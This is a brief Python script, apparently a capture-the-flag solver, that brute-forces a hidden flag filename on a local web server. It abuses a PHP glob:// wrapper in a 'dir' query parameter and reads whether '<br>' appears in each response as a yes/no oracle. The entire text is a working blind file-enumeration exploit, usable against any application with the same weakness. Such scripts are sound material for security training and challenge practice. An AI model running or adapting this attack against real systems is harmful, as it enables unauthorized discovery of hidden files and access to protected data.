import requests

URL = "http://0.0.0.0:8000"
chars = 'flag'

alphabet = "abcdefABCDEF0123456789"

for i in range(15):
    # loop over all the possible chars it could be
    for char in alphabet:
        # Check if the char matches
        PARAMS  = { 'dir': f'glob://./{chars}{char}*' }
        r =requests.get(url = URL, params = PARAMS)
        if r.text.__contains__('<br>'):
            chars += char
            break
    
    # Print the found hex so far
    print("flag" + chars)
    
    # Check if the hex ends early
    PARAMS = { 'dir': f'glob://./{chars}.txt' }
    r = requests.get(url = URL, params = PARAMS)
    if r.text.__contains__('<br>'):
        print('end')
        break

# Just make sure everything is correct
final = f"{chars}.txt"
PARAMS = {'dir': 'glob://./' + final}
r = requests.get(url = URL, params = PARAMS)
print(r.text.__contains__('<br>'))
print(final)
